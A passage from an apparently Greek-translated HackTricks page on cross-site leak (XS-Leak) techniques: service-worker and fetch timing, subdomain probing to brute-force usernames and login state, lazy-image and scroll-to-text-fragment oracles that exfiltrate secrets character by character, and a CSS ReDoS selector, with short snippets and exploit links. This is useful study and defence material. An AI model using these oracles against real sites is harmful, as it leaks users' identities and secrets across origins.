Στο δεδομένο σενάριο, ο επιτιθέμενος αναλαμβάνει την πρωτοβουλία να εγγράψει έναν **service worker** σε ένα από τα domains του, συγκεκριμένα "attacker.com". Στη συνέχεια, ο επιτιθέμενος ανοίγει ένα νέο παράθυρο στον target website από το κύριο έγγραφο και δίνει εντολή στον **service worker** να ξεκινήσει ένα χρονόμετρο. Καθώς το νέο παράθυρο αρχίζει να φορτώνει, ο επιτιθέμενος πλοηγεί την αναφορά που αποκτήθηκε στο προηγούμενο βήμα σε μια σελίδα που διαχειρίζεται ο **service worker**.

Με την άφιξη του αιτήματος που ξεκίνησε στο προηγούμενο βήμα, ο **service worker** απαντά με κωδικό κατάστασης **204 (No Content)**, τερματίζοντας ουσιαστικά τη διαδικασία πλοήγησης. Σε αυτό το σημείο, ο **service worker** καταγράφει μια μέτρηση από το χρονόμετρο που ξεκίνησε νωρίτερα στο βήμα δύο. Αυτή η μέτρηση επηρεάζεται από τη διάρκεια του JavaScript που προκαλεί καθυστερήσεις στη διαδικασία πλοήγησης.

> [!WARNING]
> Σε ένα execution timing είναι δυνατό να **εξαλείψετε** τους **παράγοντες δικτύου** για να αποκτήσετε **πιο ακριβείς μετρήσεις**. Για παράδειγμα, φορτώνοντας τους πόρους που χρησιμοποιεί η σελίδα πριν την ανοίξετε.

### Fetch Timing

- **Inclusion Methods**: Fetch API
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
- **Summary:** Χρησιμοποιήστε [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) για να μετρήσετε τον χρόνο που χρειάζεται για να εκτελεστεί ένα request. Μπορούν να χρησιμοποιηθούν και άλλα ρολόγια.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Cross-Window Timing

- **Inclusion Methods**: Pop-ups
- **Detectable Difference**: Timing (generally due to Page Content, Status Code)
- **More info**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
- **Summary:** Χρησιμοποιήστε [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) για να μετρήσετε τον χρόνο που χρειάζεται για να εκτελεστεί ένα request χρησιμοποιώντας `window.open`. Μπορούν να χρησιμοποιηθούν και άλλα ρολόγια.
- **Code Example**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

### Subdomain probing for identity/login state

- **Inclusion Methods**: HTML Elements (script), Frames
- **Detectable Difference**: DNS/HTTP load success, CORB/header changes
- **Summary:** Αν τα αναγνωριστικά βρίσκονται σε ετικέτες υποτομέων (π.χ., `www.<username>.sb.facebook.com`), κάντε αιτήματα πόρων σε υποψήφιους hosts και αντιμετωπίστε το `onload` έναντι `onerror`/timeouts ως Boolean. Συνδυάστε με login-only scripts (π.χ., `/signals/iwl.js`) για brute-force ονομάτων χρήστη και επαλήθευση auth σε σχετικές ιδιότητες.
- **Note:** Τα signals μπορούν να ενισχυθούν με διαφορετικούς τύπους ενσωμάτωσης (`script`, `iframe`, `object`) για να ανιχνεύσετε `X-Frame-Options`, `CORB`, ή διαφορές σε ανακατευθύνσεις ανά υποψήφιο.

## With HTML or Re Injection

Εδώ θα βρείτε τεχνικές για να εξάγετε πληροφορίες από cross-origin HTML όταν μπορείτε να **inject HTML content**. Αυτές οι τεχνικές είναι ενδιαφέρουσες σε περιπτώσεις όπου για κάποιον λόγο μπορείτε να **inject HTML αλλά δεν μπορείτε να inject JS code**.

### Dangling Markup


{{#ref}}
../dangling-markup-html-scriptless-injection/
{{#endref}}

### Image Lazy Loading

Αν χρειάζεστε να **exfiltrate content** και μπορείτε να **add HTML previous to the secret** θα πρέπει να ελέγξετε τις **common dangling markup techniques**.\
Ωστόσο, αν για οποιονδήποτε λόγο **MUST** πρέπει να το κάνετε **char by char** (ίσως η επικοινωνία γίνεται μέσω cache hit) μπορείτε να χρησιμοποιήσετε αυτό το κόλπο.

**Images** στο HTML έχουν ένα attribute "**loading**" της οποίας η τιμή μπορεί να είναι "**lazy**". Στην περίπτωση αυτή, η εικόνα θα φορτωθεί όταν προβληθεί και όχι κατά το φόρτωμα της σελίδας:
```html
<img src=/something loading=lazy >
```
Επομένως, αυτό που μπορείτε να κάνετε είναι να **προσθέσετε πολλούς χαρακτήρες σκουπίδια** (Για παράδειγμα **χιλιάδες "W"s**) για να **γεμίσετε τη σελίδα πριν από το μυστικό ή να προσθέσετε κάτι σαν** `<br><canvas height="1850px"></canvas><br>.`\
Τότε, για παράδειγμα, αν η **injection εμφανιστεί πριν το flag**, η **image** θα είναι **φορτωμένη**, αλλά αν εμφανιστεί **μετά** το **flag**, το flag + τα σκουπίδια θα **αποτρέψουν τη φόρτωση** (θα χρειαστεί να πειραματιστείτε με το πόσα σκουπίδια θα τοποθετήσετε). Αυτό συνέβη σε [**this writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/).

Another option would be to use the **scroll-to-text-fragment** if allowed:

#### Scroll-to-text-fragment

Ωστόσο, κάνετε τον **bot να προσπελάσει τη σελίδα** με κάτι σαν
```
#:~:text=SECR
```
Οπότε η ιστοσελίδα θα είναι κάτι σαν: **`https://victim.com/post.html#:~:text=SECR`**

Όπου το post.html περιέχει τα attacker junk chars και μια lazy load image και μετά προστίθεται το μυστικό του bot.

Αυτό το κείμενο θα κάνει το bot να προσπελάσει οποιοδήποτε κείμενο στη σελίδα που περιέχει το `SECR`. Εφόσον αυτό το κείμενο είναι το μυστικό και βρίσκεται ακριβώς **κάτω από την εικόνα**, η **εικόνα θα φορτωθεί μόνο αν το μαντέψιμο μυστικό είναι σωστό**. Έτσι έχετε το oracle σας για να **εξαγάγετε το μυστικό χαρακτήρα-χαρακτήρα**.

Κάποιο παράδειγμα κώδικα για να το εκμεταλλευτείτε: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

### Lazy Loading εικόνας βασισμένο στον χρόνο

Αν δεν είναι **δυνατό να φορτωθεί μια εξωτερική εικόνα** που θα μπορούσε να δείξει στον attacker ότι η εικόνα φορτώθηκε, μια άλλη επιλογή είναι να προσπαθήσετε να **μαντέψετε τον χαρακτήρα αρκετές φορές και να μετρήσετε αυτό**. Αν η εικόνα φορτωθεί, όλα τα requests θα διαρκέσουν περισσότερο απ' ό,τι αν η εικόνα δεν φορτωνόταν. Αυτό είναι που χρησιμοποιήθηκε στη [**λύση αυτού του writeup**](https://blog.huli.tw/2022/10/08/en/sekaictf2022-safelist-and-connection/) **περιληπτικά εδώ:**

{{#ref}}
event-loop-blocking-+-lazy-images.md
{{#endref}}

### ReDoS

{{#ref}}
../regular-expression-denial-of-service-redos.md
{{#endref}}

### CSS ReDoS

Αν χρησιμοποιείται το `jQuery(location.hash)`, είναι δυνατό να διαπιστωθεί μέσω του χρονισμού αν **υπάρχει κάποιο HTML περιεχόμενο**, αυτό επειδή αν ο selector `main[id='site-main']` δεν ταιριάζει δεν χρειάζεται να ελέγξει το υπόλοιπο των **selectors**:
```javascript
$(
"*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']"
)
```
### CSS Injection


{{#ref}}
css-injection/
{{#endref}}

## Μέτρα μετριασμού

Υπάρχουν προτεινόμενα μέτρα μετριασμού στο [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) καθώς και σε κάθε ενότητα του wiki [https://xsleaks.dev/](https://xsleaks.dev/). Ρίξτε μια ματιά εκεί για περισσότερες πληροφορίες σχετικά με το πώς να προστατευτείτε από αυτές τις τεχνικές.

## Αναφορές

- [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf)
- [https://xsleaks.dev/](https://xsleaks.dev)
- [https://github.com/xsleaks/xsleaks](https://github.com/xsleaks/xsleaks)
- [https://xsinator.com/](https://xsinator.com/)
- [https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle](https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle)
- [Cross-Site Leaks (XS-Leaks) across Meta platforms](https://ysamm.com/uncategorized/2026/01/16/cross-site-leaks.html)

{{#include ../../banners/hacktricks-training.md}}
